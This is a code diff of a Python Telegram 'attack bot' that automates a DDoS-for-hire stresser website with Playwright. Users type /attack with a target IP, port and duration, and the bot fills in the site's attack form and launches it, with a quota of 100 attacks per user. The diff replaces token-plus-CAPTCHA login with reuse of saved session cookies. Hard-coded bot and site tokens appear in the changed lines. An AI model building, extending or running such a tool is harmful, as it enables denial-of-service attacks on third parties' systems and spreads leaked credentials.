@@ -5,22 +5,19 @@ import threading
 import time
 import asyncio
 import glob
+import pickle
 from datetime import datetime
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler, ConversationHandler
-from playwright.async_api import async_playwright
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes, ConversationHandler
 
 # ==================== CONFIG ====================
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8521144614:AAH0d-UUxRQESHVStJD3dbsb956vf4q77h8"
+BOT_TOKEN = "8521144614:AAGU7FdEIa5niSCLOpMqD1lbXmif4PFkoFM"
 WEBSITE_URL = "https://satellitestress.st/attack"
 LOGIN_URL = "https://satellitestress.st/login"
-WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"
-
-# Conversation states
-CAPTCHA_WAIT = 1
+COOKIE_FILE = "session_cookies.json"
 
 # ==================== ATTACK TRACKING ====================
 attack_file = "attacks.json"
@@ -40,7 +37,6 @@ attacks = load_attacks()
 
 # ==================== PLAYWRIGHT SETUP ====================
 def get_playwright_chromium_path():
-    """Find Playwright's installed Chromium path"""
     cache_dir = os.path.expanduser("~/.cache/ms-playwright")
     chromium_folders = glob.glob(f"{cache_dir}/chromium-*")
     
@@ -50,203 +46,149 @@ def get_playwright_chromium_path():
             return linux_path
     return None
 
-# ==================== PLAYWRIGHT ATTACK FUNCTION WITH CAPTCHA ====================
-async def launch_attack_playwright(ip, port, duration, update, context):
+# ==================== COOKIE FUNCTIONS ====================
+async def save_cookies(page):
+    """Save cookies after successful login"""
+    cookies = await page.context.cookies()
+    with open(COOKIE_FILE, 'w') as f:
+        json.dump(cookies, f)
+    return True
+
+async def load_cookies(context):
+    """Load saved cookies"""
+    try:
+        with open(COOKIE_FILE, 'r') as f:
+            cookies = json.load(f)
+            await context.add_cookies(cookies)
+            return True
+    except:
+        return False
+
+# ==================== SETUP COMMAND ====================
+async def setup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Run this ONCE to save cookies"""
+    await update.message.reply_text(
+        "🔄 **SETUP MODE**\n\n"
+        "1. I'll open browser\n"
+        "2. You login manually\n"
+        "3. Come back and type /done\n\n"
+        "Starting browser..."
+    )
+    
+    # Store that we're in setup mode
+    context.user_data['setup_mode'] = True
+    
+    # Run browser in thread
+    def setup_thread():
+        asyncio.run(setup_browser(update, context))
+    
+    thread = threading.Thread(target=setup_thread)
+    thread.start()
+
+async def setup_browser(update, context):
+    """Open browser for manual login"""
     try:
         async with async_playwright() as p:
-            chromium_path = get_playwright_chromium_path()
+            browser = await p.chromium.launch(headless=False)
+            context_obj = await browser.new_context()
+            page = await context_obj.new_page()
             
+            # Go to login page
+            await page.goto(LOGIN_URL)
+            
+            # Wait for user to press /done
+            context.user_data['setup_page'] = page
+            context.user_data['setup_browser'] = browser
+            context.user_data['setup_context'] = context_obj
+            
+    except Exception as e:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"❌ Setup error: {str(e)}"
+        )
+
+async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """After manual login, save cookies"""
+    if not context.user_data.get('setup_mode'):
+        await update.message.reply_text("❌ Not in setup mode. Use /setup first")
+        return
+    
+    page = context.user_data.get('setup_page')
+    browser = context.user_data.get('setup_browser')
+    
+    if page and browser:
+        try:
+            # Save cookies
+            await save_cookies(page)
+            await browser.close()
+            
+            await update.message.reply_text(
+                "✅ **COOKIES SAVED!**\n\n"
+                "Now you can use /attack command without logging in!"
+            )
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error saving cookies: {str(e)}")
+    else:
+        await update.message.reply_text("❌ Browser not running. Use /setup again")
+    
+    context.user_data.clear()
+
+# ==================== ATTACK WITH COOKIES ====================
+async def attack_with_cookies(ip, port, duration, update, context):
+    """Attack using saved cookies - NO LOGIN NEEDED"""
+    try:
+        async with async_playwright() as p:
+            # Launch browser
+            chromium_path = get_playwright_chromium_path()
             if chromium_path:
                 browser = await p.chromium.launch(executablePath=chromium_path, headless=True)
             else:
                 browser = await p.chromium.launch(headless=True)
             
-            context_obj = await browser.new_context(viewport={'width': 1280, 'height': 720})
+            # Create context and load cookies
+            context_obj = await browser.new_context()
+            cookies_loaded = await load_cookies(context_obj)
+            
+            if not cookies_loaded:
+                await browser.close()
+                return False, "❌ No saved cookies. Run /setup first!"
+            
+            # Create page with cookies
             page = await context_obj.new_page()
             
-            # ========== LOGIN PAGE ==========
-            print("🔑 Logging in...")
-            await page.goto(LOGIN_URL, wait_until='networkidle')
-            await page.wait_for_timeout(3000)
-            
-            # 🔥 DEBUG: Current URL
-            current_url = page.url
-            print(f"📍 Current URL: {current_url}")
-            await context.bot.send_message(
-                chat_id=update.effective_chat.id,
-                text=f"📍 Current URL: `{current_url}`"
-            )
-            
-            # 🔥 DEBUG: Saare elements check
-            all_inputs = await page.query_selector_all('input')
-            print(f"🔍 Total inputs on page: {len(all_inputs)}")
-            
-            for i, inp in enumerate(all_inputs):
-                input_type = await inp.get_attribute('type') or 'text'
-                input_name = await inp.get_attribute('name') or 'No name'
-                input_placeholder = await inp.get_attribute('placeholder') or 'No placeholder'
-                print(f"  Input {i}: type={input_type}, name={input_name}, placeholder={input_placeholder}")
-            
-            # 🔥 DEBUG: Saare buttons check
-            all_buttons = await page.query_selector_all('button')
-            print(f"🔍 Total buttons on page: {len(all_buttons)}")
-            
-            for i, btn in enumerate(all_buttons):
-                btn_text = await btn.text_content() or 'No text'
-                btn_class = await btn.get_attribute('class') or 'No class'
-                print(f"  Button {i}: text='{btn_text[:30]}', class='{btn_class[:30]}'")
-            
-            # 🔥 DEBUG: CAPTCHA check
-            captcha_input = await page.query_selector('input[name="captcha"]')
-            captcha_img = await page.query_selector('img[alt*="captcha"], img[src*="captcha"]')
-            
-            if captcha_input:
-                print("✅ CAPTCHA input found")
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text="✅ CAPTCHA input field detected"
-                )
-            
-            if captcha_img:
-                print("✅ CAPTCHA image found")
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text="✅ CAPTCHA image detected"
-                )
-            
-            # 🔥 DEBUG: Screenshot
-            await page.screenshot(path='debug_login.png')
-            await context.bot.send_photo(
-                chat_id=update.effective_chat.id,
-                photo=open('debug_login.png', 'rb'),
-                caption="📸 Login page screenshot"
-            )
-            
-            # Ab token field find karo
-            token_field = None
-            for inp in all_inputs:
-                if await inp.get_attribute('type') == 'text':
-                    token_field = inp
-                    break
-            
-            if not token_field:
-                await browser.close()
-                return False, "❌ Token field not found"
-            
-            await token_field.fill(WEBSITE_TOKEN)
-            print("✅ Token entered")
-            
-            # CAPTCHA handling agar ho to
-            if captcha_input and captcha_img:
-                # CAPTCHA detected! Send to user
-                await context.bot.send_message(
-                    chat_id=update.effective_chat.id,
-                    text="🔐 **CAPTCHA DETECTED!** Solving..."
-                )
-                
-                # Take screenshot of CAPTCHA
-                await captcha_img.screenshot(path='captcha.png')
-                
-                # Send to Telegram for manual solving
-                await context.bot.send_photo(
-                    chat_id=update.effective_chat.id,
-                    photo=open('captcha.png', 'rb'),
-                    caption="🔑 **Please enter the CAPTCHA text:**"
-                )
-                
-                # Store browser/page for later use
-                context.user_data['awaiting_captcha'] = True
-                context.user_data['captcha_page'] = page
-                context.user_data['browser'] = browser
-                context.user_data['attack_params'] = (ip, port, duration)
-                
-                return False, "CAPTCHA_REQUIRED"
-            
-            # Find login button
-            login_btn = None
-            for btn in all_buttons:
-                btn_text = await btn.text_content() or ''
-                if 'login' in btn_text.lower() or 'sign in' in btn_text.lower():
-                    login_btn = btn
-                    break
-            
-            if not login_btn:
-                # Try by class
-                login_btn = await page.query_selector('button.bg-yellow-600')
-            
-            if not login_btn and all_buttons:
-                login_btn = all_buttons[0]  # First button as fallback
-            
-            if login_btn:
-                await login_btn.click()
-                print("✅ Login button clicked")
-                await page.wait_for_timeout(5000)
-                
-                # 🔥 DEBUG: After login URL
-                after_login_url = page.url
-                print(f"📍 After login URL: {after_login_url}")
-                
-                if 'attack' not in after_login_url:
-                    # Login failed - show page source
-                    content = await page.content()
-                    with open("login_failed.html", "w", encoding="utf-8") as f:
-                        f.write(content)
-                    
-                    await context.bot.send_message(
-                        chat_id=update.effective_chat.id,
-                        text=f"❌ Login failed. Current URL: {after_login_url}\nCheck login_failed.html"
-                    )
-                    
-                    await browser.close()
-                    return False, "❌ Login failed"
-            else:
-                await browser.close()
-                return False, "❌ Login button not found"
-            
-            # ========== ATTACK PAGE ==========
-            print("🎯 Navigating to attack page...")
+            # DIRECTLY go to attack page - NO LOGIN!
             await page.goto(WEBSITE_URL, wait_until='networkidle')
             await page.wait_for_timeout(3000)
             
-            # 🔥 DEBUG: Attack page URL
-            attack_url = page.url
-            print(f"📍 Attack page URL: {attack_url}")
+            # Check if we're on attack page
+            current_url = page.url
+            if "login" in current_url:
+                await browser.close()
+                return False, "❌ Cookies expired. Run /setup again!"
             
-            # 🔥 DEBUG: Attack page screenshot
-            await page.screenshot(path='debug_attack.png')
-            await context.bot.send_photo(
-                chat_id=update.effective_chat.id,
-                photo=open('debug_attack.png', 'rb'),
-                caption="📸 Attack page screenshot"
-            )
+            # Fill attack form
+            inputs = await page.query_selector_all('input[type="text"]')
             
-            # ========== FILL ATTACK FORM ==========
-            attack_inputs = await page.query_selector_all('input[type="text"]')
-            print(f"🔍 Found {len(attack_inputs)} input fields on attack page")
-            
-            if len(attack_inputs) >= 3:
-                await attack_inputs[0].fill(ip)
-                await attack_inputs[1].fill(str(port))
-                await attack_inputs[2].fill(str(duration))
-                print("✅ Attack form filled")
+            if len(inputs) >= 3:
+                await inputs[0].fill(ip)
+                await inputs[1].fill(str(port))
+                await inputs[2].fill(str(duration))
             else:
                 await browser.close()
-                return False, f"❌ Only {len(attack_inputs)} inputs found on attack page"
+                return False, f"❌ Only {len(inputs)} inputs found"
             
-            # ========== CLICK LAUNCH BUTTON ==========
+            # Click launch button
             launch_btn = await page.query_selector('button:has-text("Launch")')
             if not launch_btn:
-                attack_buttons = await page.query_selector_all('button')
-                if attack_buttons:
-                    launch_btn = attack_buttons[-1]
+                buttons = await page.query_selector_all('button')
+                if buttons:
+                    launch_btn = buttons[-1]
             
             if launch_btn:
                 await launch_btn.click()
-                print("✅ Launch button clicked")
-                
                 await page.wait_for_timeout(3000)
                 
-                # Check if attack started
+                # Check attack status
                 page_content = await page.content()
                 if "attack started" in page_content.lower():
                     status = "ATTACK LAUNCHED SUCCESSFULLY"
@@ -262,102 +204,7 @@ async def launch_attack_playwright(ip, port, duration, update, context):
     except Exception as e:
         return False, str(e)
 
-# ==================== HANDLE CAPTCHA RESPONSE ====================
-async def handle_captcha_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle user's CAPTCHA answer"""
-    user_input = update.message.text.strip()
-    
-    if context.user_data.get('awaiting_captcha'):
-        await update.message.reply_text("🔄 **Processing CAPTCHA...**")
-        
-        # Get stored page and browser
-        page = context.user_data.get('captcha_page')
-        browser = context.user_data.get('browser')
-        ip, port, duration = context.user_data.get('attack_params', (None, None, None))
-        
-        if page and browser:
-            try:
-                # Fill CAPTCHA
-                captcha_input = await page.query_selector('input[name="captcha"]')
-                if captcha_input:
-                    await captcha_input.fill(user_input)
-                    
-                    # Click login
-                    login_btn = await page.query_selector('button.bg-yellow-600')
-                    if login_btn:
-                        await login_btn.click()
-                        print("✅ Login button clicked after CAPTCHA")
-                        await page.wait_for_timeout(5000)
-                    
-                    # Go to attack page
-                    await page.goto(WEBSITE_URL, wait_until='networkidle')
-                    await page.wait_for_timeout(3000)
-                    
-                    # Fill attack form
-                    inputs = await page.query_selector_all('input[type="text"]')
-                    if len(inputs) >= 3:
-                        await inputs[0].fill(ip)
-                        await inputs[1].fill(str(port))
-                        await inputs[2].fill(str(duration))
-                        
-                        # Click launch
-                        launch_btn = await page.query_selector('button:has-text("Launch")')
-                        if launch_btn:
-                            await launch_btn.click()
-                            await page.wait_for_timeout(3000)
-                            
-                            # Check attack status
-                            page_content = await page.content()
-                            if "attack started" in page_content.lower() or "launching" in page_content.lower():
-                                status = "✅ **ATTACK SENDING SOON**"
-                            else:
-                                status = "✅ **ATTACK LAUNCHED SUCCESSFULLY**"
-                            
-                            await update.message.reply_text(status)
-                            
-                            # Update attack count
-                            user_id = update.effective_user.id
-                            counts = attacks.get("user_counts", {})
-                            user_key = str(user_id)
-                            counts[user_key] = counts.get(user_key, 0) + 1
-                            attacks["user_counts"] = counts
-                            save_attacks(attacks)
-                            
-                            remaining = 100 - counts.get(user_key, 0)
-                            await update.message.reply_text(f"🎯 Attacks remaining: {remaining}/100")
-                        else:
-                            await update.message.reply_text("❌ Launch button not found")
-                    else:
-                        await update.message.reply_text(f"❌ Only {len(inputs)} inputs found")
-                else:
-                    await update.message.reply_text("❌ CAPTCHA input field not found")
-                    
-            except Exception as e:
-                await update.message.reply_text(f"❌ Error: {str(e)}")
-            finally:
-                await browser.close()
-                context.user_data.clear()
-        else:
-            await update.message.reply_text("❌ Session expired. Start again with /attack")
-            context.user_data.clear()
-        
-        return ConversationHandler.END
-    
-    return
-
-# ==================== COMMAND HANDLERS ====================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command"""
-    await update.message.reply_text(
-        "🤖 **ATTACK BOT**\n\n"
-        "Commands:\n"
-        "• `/attack <ip> <port> <time>` - Launch attack\n"
-        "  Example: `/attack 1.1.1.1 80 60`\n\n"
-        "• `/status` - Check attack status\n"
-        "• `/stats` - Your attack stats\n"
-        "• `/help` - Show help"
-    )
-
+# ==================== ATTACK COMMAND ====================
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /attack command"""
     user_id = update.effective_user.id
@@ -420,22 +267,18 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     def attack_thread():
         try:
-            # Create new event loop for thread
             new_loop = asyncio.new_event_loop()
             asyncio.set_event_loop(new_loop)
             
-            # Run attack
+            # Run attack with cookies
             success, result = new_loop.run_until_complete(
-                launch_attack_playwright(ip, port, duration, update, context)
+                attack_with_cookies(ip, port, duration, update, context)
             )
             
-            if result == "CAPTCHA_REQUIRED":
-                # CAPTCHA handling is done separately
-                return
-            
-            # Update attack counts
             attacks["current"] = None
+            
             if success:
+                # Update attack count
                 counts = attacks.get("user_counts", {})
                 user_key = str(user_id)
                 counts[user_key] = counts.get(user_key, 0) + 1
@@ -444,10 +287,9 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             remaining = 100 - attacks.get("user_counts", {}).get(str(user_id), 0)
             
-            # Send result
             async def send_result():
                 if success:
-                    if result == "ATTACK LAUNCHED":
+                    if result == "ATTACK LAUNCHED SUCCESSFULLY":
                         status_msg = "✅ **ATTACK LAUNCHED SUCCESSFULLY!**"
                     else:
                         status_msg = "✅ **ATTACK SENDING SOON!**"
@@ -483,8 +325,21 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     thread.daemon = True
     thread.start()
 
+# ==================== OTHER COMMANDS ====================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🤖 **ATTACK BOT**\n\n"
+        "**First time setup:**\n"
+        "1. `/setup` - Login manually once\n"
+        "2. After login, type `/done`\n\n"
+        "**Then use:**\n"
+        "• `/attack <ip> <port> <time>` - Launch attack\n"
+        "  Example: `/attack 1.1.1.1 80 60`\n"
+        "• `/status` - Check attack status\n"
+        "• `/stats` - Your attack stats"
+    )
+
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check attack status"""
     if attacks.get("current"):
         attack = attacks["current"]
         elapsed = int(time.time() - attack.get("start_time", time.time()))
@@ -500,7 +355,6 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("✅ No active attacks. Ready to launch!")
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user stats"""
     user_id = update.effective_user.id
     user_key = str(user_id)
     
@@ -510,50 +364,26 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"📊 **YOUR STATS**\n\n"
         f"✅ Attacks Used: {used}\n"
-        f"🎯 Attacks Left: {remaining}/100\n"
-        f"🆔 User ID: `{user_id}`"
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show help"""
-    await update.message.reply_text(
-        "🆘 **HELP**\n\n"
-        "**Commands:**\n"
-        "• `/attack <ip> <port> <time>` - Launch attack\n"
-        "  Example: `/attack 1.1.1.1 80 60`\n"
-        "• `/status` - Check current attack\n"
-        "• `/stats` - Your attack usage\n"
-        "• `/help` - Show this message\n\n"
-        "**Time range:** 10-300 seconds\n"
-        "**Port range:** 1-65535\n\n"
-        "If CAPTCHA appears, enter it when prompted."
+        f"🎯 Attacks Left: {remaining}/100"
     )
 
 # ==================== MAIN ====================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # Command handlers
+    # Commands
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("setup", setup_command))
+    app.add_handler(CommandHandler("done", done_command))
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("stats", stats_command))
-    app.add_handler(CommandHandler("help", help_command))
-    
-    # CAPTCHA response handler
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_captcha_response))
     
     print("="*50)
-    print("🔥 COMMAND-BASED ATTACK BOT STARTED")
+    print("🔥 COOKIE-BASED ATTACK BOT")
     print("="*50)
-    print("Commands:")
-    print("  /attack <ip> <port> <time>")
-    print("  /status")
-    print("  /stats")
-    print("  /help")
-    print("="*50)
-    print("👤 Everyone gets 100 attacks")
-    print("🔐 Manual CAPTCHA handling enabled")
+    print("First time: /setup → login → /done")
+    print("Then: /attack ip port time")
     print("="*50)
     
     app.run_polling()
